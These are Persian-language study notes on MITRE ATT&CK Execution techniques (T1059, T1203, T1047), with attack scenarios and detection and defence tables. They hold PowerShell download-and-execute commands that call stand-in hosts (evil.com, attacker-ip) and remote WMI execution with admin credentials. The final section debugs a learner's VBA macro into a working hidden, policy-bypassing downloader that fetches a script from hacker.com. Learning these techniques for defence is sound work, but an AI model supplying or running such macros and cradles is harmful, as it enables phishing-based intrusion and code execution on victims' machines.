



---

### 🎯 **Tactic: Execution | اجرای کد**

> **🔹 ترجمه فارسی:**  
> مهاجم تلاش می‌کند که **کد مخرب** را روی یک سیستم **محلی یا راه‌دور** اجرا کند.

---

### 🧠 **شرح کامل:**

تاکتیک **Execution (اجرا)** شامل تکنیک‌هایی است که باعث می‌شود **کدی که مهاجم کنترل می‌کند، روی یک سیستم اجرا شود**. این اجرا می‌تواند روی:

- سیستم خود قربانی (محلی)
    
- یا روی یک سیستم دیگر در شبکه (راه‌دور)
    

---

### 🧨 هدف مهاجم از اجرای کد:

اجرای کد صرفاً هدف نهایی نیست، بلکه اغلب این مرحله به عنوان **دروازه‌ای برای اجرای مراحل دیگر حمله** استفاده می‌شود. مثل:

- جمع‌آوری اطلاعات از سیستم (Discovery)
    
- حرکات جانبی در شبکه (Lateral Movement)
    
- استخراج اطلاعات (Exfiltration)
    

---

### 🧪 مثال ساده:

فرض کن مهاجم دسترسی اولیه گرفته (مثلاً از طریق فیشینگ). حالا می‌خواد ابزار خودش رو اجرا کنه، مثلاً:

> ✴️ اجرای یک PowerShell Script برای شناسایی سیستم‌های دیگر در شبکه (Remote System Discovery)

---

### 🔧 تکنیک‌های Execution معمولاً با چه چیزهایی همراه می‌شن؟

با تاکتیک‌ها و تکنیک‌های دیگه، مثل:

- **Persistence** (پایداری)
    
- **Credential Access** (دسترسی به اطلاعات کاربری)
    
- **Defense Evasion** (دور زدن دفاع‌ها)
    

---

### 🛠️ ابزارها و زبان‌های پرکاربرد در Execution:

- PowerShell
    
- CMD / Batch files
    
- VBScript
    
- C#, C++
    
- ابزارهای RMM یا RAT مثل Cobalt Strike، Sliver
    

---

اگر آماده‌ای، می‌تونیم بریم سراغ **تکنیک‌های مربوط به Execution** مثل:

- `T1059 – Command and Scripting Interpreter`
    
- `T1203 – Exploitation for Client Execution`
    
- `T1047 – Windows Management Instrumentation`
    



#T1059
---

## 🎯 تکنیک: `T1059 – Command and Scripting Interpreter`

### 🔸 ترجمه:

> **مفسرهای دستوری و اسکریپتی**  
> مهاجم از ابزارهای خط فرمان یا اسکریپت‌نویسی برای اجرای کد روی سیستم هدف استفاده می‌کند.

---

### 🧠 مفهوم کلی:

مهاجم برای اجرای کد مخرب یا دستورات خود، از **ترمینال‌ها** یا **مفسرهای اسکریپت‌نویسی** استفاده می‌کند؛ این ابزارها به مهاجم اجازه می‌دهند تا با سیستم قربانی صحبت کند و فرمان‌هایی را اجرا کند.

---

### 📚 زیرتکنیک‌ها (Sub-techniques):

|Sub-Technique|توضیح|
|---|---|
|`T1059.001 – PowerShell`|اجرای دستورات مخرب با PowerShell روی ویندوز|
|`T1059.002 – CMD`|استفاده از cmd.exe برای اجرای دستوراتی مثل `net user`, `ping`, `whoami`|
|`T1059.003 – Windows Script Host (WSH)`|اجرای فایل‌های `.vbs` یا `.js` با ابزار `wscript.exe` یا `cscript.exe`|
|`T1059.004 – Unix Shell`|اجرای اسکریپت‌های Bash یا Zsh در لینوکس و macOS|
|`T1059.005 – Visual Basic`|اجرای کدهای VB، معمولاً در ماکروهای آفیس|
|`T1059.006 – Python`|استفاده از Python برای اجرای کد مخرب (مخصوصاً در سیستم‌هایی که Python نصب دارند)|
|`T1059.007 – JavaScript`|اجرای JavaScript در سناریوهایی مثل مرورگر یا WSH|

---

### 🧪 مثال سناریو (در ویندوز):

1. مهاجم از طریق ایمیل فیشینگ فایل Word آلوده به ماکرو ارسال می‌کند.
    
2. کاربر فایل را باز می‌کند.
    
3. ماکرو اجرا شده و PowerShell باز می‌شود:
    
    ```powershell
    powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
    ```
    
4. کد از راه دور دانلود شده و اجرا می‌شود → دسترسی مهاجم برقرار می‌شود.
    

---

### 🎯 چرا این تکنیک محبوب است؟

- در اکثر سیستم‌ها ابزارهایی مثل CMD یا PowerShell از قبل نصب هستند.
    
- به راحتی می‌توان کد را از راه دور دانلود و اجرا کرد.
    
- برای تحلیلگران امنیتی، اگر لاگ‌برداری مناسب انجام نشود، تشخیص این حمله سخت می‌شود.
    
- برای دور زدن آنتی‌ویروس‌ها می‌توان اسکریپت‌ها را Obfuscate کرد.
    

---

### 🛡️ راهکارهای دفاعی:

|روش|توضیح|
|---|---|
|Logging|فعال‌سازی PowerShell Logging (مانند: Module Logging, ScriptBlock Logging)|
|AMSI|استفاده از Anti-Malware Scan Interface برای اسکن اسکریپت‌ها|
|Application Control|محدود کردن اجرای PowerShell یا WSH فقط برای Adminها|
|EDR|استفاده از ابزارهای EDR برای مانیتور کردن اجرای اسکریپت‌ها|

---
#T1203
---

## 💥 تکنیک: `T1203 – Exploitation for Client Execution`

### 🔸 ترجمه:

> **سوءاستفاده از آسیب‌پذیری برای اجرای کد در سمت کلاینت**

---

### 🧠 مفهوم کلی:

در این تکنیک، مهاجم از **آسیب‌پذیری‌های موجود در نرم‌افزارهایی که توسط کاربر (Client) اجرا می‌شوند** سوءاستفاده می‌کند تا **کد دلخواه خود را روی سیستم قربانی اجرا کند.**

این نرم‌افزارها می‌تونند شامل:

- مرورگرها (مثل Chrome, Edge, Firefox)
    
- برنامه‌های آفیس (Word, Excel)
    
- PDF Reader
    
- Java, Flash Player
    
- و حتی برخی نرم‌افزارهای ایمیل‌خوان (Outlook و...)
    

باشند.

---

### 🧪 یک سناریوی ساده:

1. مهاجم یک فایل PDF آلوده می‌سازد که حاوی اکسپلویت برای Adobe Reader است.
    
2. فایل را از طریق ایمیل یا لینک ارسال می‌کند.
    
3. کاربر فایل را باز می‌کند.
    
4. بدون اینکه کاربر متوجه شود، **کد مخرب اجرا می‌شود** و مثلاً reverse shell باز می‌شود.
    

---

### 🎯 هدف این تکنیک:

- **دستیابی به اجرای کد روی سیستم قربانی بدون نیاز به تعامل زیاد**
    
- معمولاً این تکنیک بخشی از **initial access** یا **execution** است.
    

---

### 🧰 ابزارهایی که ممکنه در این تکنیک استفاده بشن:

- `Metasploit` (مثلاً ماژول‌های exploit/windows/fileformat/…)
    
- `Exploit kits` مثل RIG یا Fallout
    
- اکسپلویت‌های zero-day یا معروف مثل:
    
    - CVE-2017-0199 (Word)
        
    - CVE-2021-40444 (ActiveX / Office)
        
    - CVE-2018-8174 (VBScript در IE)
        

---

### 🛡️ راهکارهای دفاعی:

|روش|توضیح|
|---|---|
|Patch Management|به‌روزرسانی منظم نرم‌افزارهای کلاینتی (مرورگر، آفیس، PDF و...)|
|محدود کردن ماکروها|غیرفعال کردن ماکرو در Office برای فایل‌های مشکوک|
|EDR/AV|شناسایی اجرای مشکوک یا اکسپلویت‌شده|
|Application Whitelisting|فقط اجازه اجرای نرم‌افزارهای تایید شده|

---

### 🔍 از کجا بفهمیم این تکنیک استفاده شده؟

- تحلیل لاگ‌های سیستم برای اجرای ناگهانی نرم‌افزارهایی مثل `winword.exe`, `excel.exe`, `AcroRd32.exe`
    
- بررسی اجرای فایل‌های بدون امضا یا از مسیرهای مشکوک
    
- استفاده از ابزارهایی مثل Sysmon، EDR، یا Event Viewer
    

---
#T1047
---

## 🛠️ تکنیک: `T1047 – Windows Management Instrumentation (WMI)`

### 🔸 ترجمه:

> **استفاده از WMI (مدیریت ابزارهای ویندوز) برای اجرای دستورات، جمع‌آوری اطلاعات یا حرکت در شبکه**

---

### 🧠 مفهوم کلی:

WMI یا **Windows Management Instrumentation** یک فناوری در ویندوز است که به ادمین‌ها اجازه می‌دهد:

- اطلاعات سیستمی جمع‌آوری کنند
    
- اسکریپت اجرا کنند
    
- سیستم‌ها را از راه دور مدیریت کنند
    

🔴 مهاجم‌ها نیز دقیقاً از همین ابزار داخلی ویندوز سوءاستفاده می‌کنند، چون:

- نیازی به نصب نرم‌افزار اضافه نیست
    
- اجرای آن معمولاً توسط سیستم‌های امنیتی کمتر تشخیص داده می‌شود (Living Off The Land)
    

---

### 🎯 اهداف رایج در استفاده از WMI:

|هدف|مثال|
|---|---|
|اجرای دستور از راه دور|اجرای PowerShell یا CMD روی سیستم دیگر|
|جمع‌آوری اطلاعات|لیست پروسس‌ها، اطلاعات سیستم، یوزرها|
|حرکت جانبی (Lateral Movement)|اجرای کد روی کلاینت‌های دیگر با دسترسی Admin|
|پایداری (Persistence)|ساخت WMI Event Subscription برای اجرای مداوم|

---

### 🧪 مثال‌های عملی:

#### ✅ اجرای دستور از راه دور با WMI:

```powershell
wmic /node:"192.168.1.10" /user:"admin" /password:"pass123" process call create "cmd.exe /c whoami"
```

#### ✅ استفاده از PowerShell:

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName TARGET-PC
```

---

### 👀 چرا این تکنیک خطرناک است؟

- کاملاً نیتیو (داخلی ویندوز) است.
    
- می‌تواند از راه دور بدون نیاز به نرم‌افزار اضافی انجام شود.
    
- قابلیت اجرای کد، جمع‌آوری اطلاعات، و حتی استفاده برای _Persistence_ دارد.
    

---

### 🛡️ راهکارهای دفاعی:

|روش|توضیح|
|---|---|
|Sysmon|فعال‌سازی و لاگ‌برداری از `Event ID 1` و `Event ID 3` برای اجرای Process|
|محدودسازی دسترسی|فقط کاربران خاص اجازه اجرای دستورات WMI داشته باشند|
|EDR|پایش رفتار مشکوک مثل اجرای نامعمول پروسس از راه دور|
|Firewall|بستن پورت‌های WMI (RPC پورت TCP 135 و dynamic ports)|

---

### 📌 تکنیک‌های مرتبط:

- `T1028 – Remote Services (like RDP)`
    
- `T1059 – Command and Scripting Interpreter`
    
- `T1086 – PowerShell` (قدیمی، حالا زیرمجموعه T1059.001)
    


---

## 🎬 سناریو: مهاجم با دسترسی Admin، از یک سیستم ویندوزی روی سیستم دیگر **دستور اجرا می‌کنه**

### 🧱 محیط فرضی:

|سیستم|نقش|IP|
|---|---|---|
|Attacker-PC|سیستم مهاجم|`192.168.1.100`|
|Target-PC|سیستم قربانی|`192.168.1.110`|

مهاجم **یوزر و پسورد ادمین** سیستم Target رو از قبل به‌دست آورده و حالا می‌خواد از طریق WMI یک دستور ساده (مثلاً `whoami`) روی سیستم قربانی اجرا کنه.

---

### 🛠️ ابزار مورد استفاده:

- `wmic.exe` (ابزار داخلی ویندوز)
    
- یا `PowerShell`
    

---

## ✴️ مرحله 1: اجرای دستور از راه دور با `wmic`

```bash
wmic /node:"192.168.1.110" /user:"DOMAIN\admin" /password:"Password123" process call create "cmd.exe /c whoami > C:\windows\temp\output.txt"
```

🔍 این دستور:

- روی سیستم هدف (`192.168.1.110`) اجرا می‌شه
    
- کاربر جاری رو با دستور `whoami` می‌گیره
    
- خروجی رو توی فایل `output.txt` ذخیره می‌کنه
    

---

## ✴️ مرحله 2: اجرای فایل مخرب با PowerShell

مهاجم می‌خواد ابزار خودش (مثلاً reverse shell) رو از راه دور اجرا کنه:

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/payload.ps1')" -ComputerName 192.168.1.110 -Credential (Get-Credential)
```

🧨 اینجا مهاجم:

- فایل `payload.ps1` را از سرورش دانلود می‌کنه
    
- با PowerShell روی سیستم هدف اجرا می‌شه
    
- این فایل ممکنه reverse shell ایجاد کنه یا credential استخراج کنه
    

---

## 🧪 لاگ‌ها و شناسایی (Defender view):

- این رفتار در **Event Viewer** با ID زیر ثبت میشه:
    
    - **Sysmon Event ID 1:** اجرای Process از راه دور
        
    - **Security Event ID 4624:** ورود RCP (اگر احراز هویت از راه دور باشه)
        
    - **WMI-Activity logs** در مسیر:  
        `Applications and Services Logs > Microsoft > Windows > WMI-Activity > Operational`
        

---

## 🛡️ نکات دفاعی:

|ابزار|چه چیزی را نشان می‌دهد|
|---|---|
|Sysmon + SIEM|اجرای ناگهانی PowerShell از یک فرآیند WMI|
|Wazuh / Elastic|ایجاد پروسس مشکوک توسط `wmiprvse.exe`|
|Windows Defender ASR|مسدودسازی اجرای PowerShell از طریق WMI|
|Group Policy|غیرفعال‌سازی اجرای WMI از راه دور برای کاربران عادی|

---

	
---

### **۱) وقتی داری با یک "شیء" کار می‌کنی → باید `Object` باشه**

- مثال:
    
    ```vba
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    ```
    
    اینجا **`shell` یک شیءه** که توش متد (`Run`) و پراپرتی‌های مختلف هست.  
    همیشه برای **اشیاء (Objects)** باید `Set` هم استفاده کنی.
    

---

### **۲) وقتی داری با "رشته یا مقدار ساده" کار می‌کنی → باید `String` باشه**

- مثال:
    
    ```vba
    Dim cmd As String
    cmd = "powershell -ExecutionPolicy Bypass -Command ""Write-Host 'Hello'"""
    ```
    
    اینجا **`cmd` فقط یه متن معمولیه** (یه دستور PowerShell).  
    برای مقداردهی به `String` دیگه `Set` لازم نیست.
    

---

### **اشتباه رایج (مثل کدی که خودت داشتی):**

تو این کار رو کرده بودی:

```vba
Dim payload As String
Set payload = CreateObject("WScript.Shell")
```

اینجا داری یک **Object رو میریزی توی یک متغیر String** → که **Type mismatch** می‌ده.  
باید دو تا متغیر جدا باشه:

```vba
Dim psCmd As String
Dim shell As Object
psCmd = "powershell.exe -Command ""Write-Host 'Hello'"""
Set shell = CreateObject("WScript.Shell")
shell.Run psCmd
```

---

### **یه قاعده خیلی ساده:**

- **چیزهایی که توشون متد (`.Run`, `.Open`, …) دارن → `Object`**
    
- **چیزهایی که فقط متن، عدد یا مسیر هستن → `String` یا `Integer` و…**
    

---


---

### **مشکلات کد شما:**

1. **متغیر `payload` رو اول `String` تعریف کردی بعد دوباره شیء بهش اختصاص دادی**
    
    - این باعث می‌شه کدت خطا بده (`Type mismatch`).
        
    - باید **دو تا متغیر جدا داشته باشی**: یکی برای رشته دستور (`String`) و یکی برای شیء `WScript.Shell`.
        
2. **ساختار دستور PowerShell اشتباهه**
    
    - بین پارامترها فاصله‌ها درست نیست.
        
    - بخش `iex()` درست نوشته نشده (باید `""` به درستی escape بشن).
        
    - آدرس و مسیر رو هم قاطی کردی.
        
3. **تو Run داری `cmd.exe` رو اجرا می‌کنی ولی اصلاً از متغیر رشته‌ای استفاده نکردی**
    
    - تو می‌خواستی PowerShell رو اجرا کنی، نه یه CMD خالی.
        

---

```vba
Sub test()
    Dim psCmd As String
    Dim shell As Object
    

    psCmd = "powershell.exe -ExecutionPolicy Bypass -NoExit -NoProfile -WindowStyle Hidden " & _
            "-Command ""iex ((New-Object Net.WebClient).DownloadString('https://hacker.com/script.ps1'))"""
    

    Set shell = CreateObject("WScript.Shell")
    

    shell.Run psCmd, 0, False
End Sub
```

---



- **`psCmd`** → دستور کامل PowerShell
    
- **`iex()`** → معادل `Invoke-Expression` برای اجرای مستقیم اسکریپت دانلودشده.
    
- **`DownloadString`** → محتوای فایل اسکریپت رو از URL می‌گیره.
    
- **`0`** → اجرا به‌صورت **مخفی**.
    

---

### **چرا این روش رو استفاده می‌کنن؟**

این **الگوی واقعی ماکروهای مخرب**ه:

- با PowerShell می‌رن اسکریپت رو از اینترنت می‌گیرن.
    
- `-WindowStyle Hidden` → کاربر هیچی نمی‌بینه.
    
- `-ExecutionPolicy Bypass` → حتی اگه سیاست اجرای اسکریپت توی ویندوز قفل باشه، باز هم اجرا می‌شه.
    

---


https://lolbas-project.github.io/

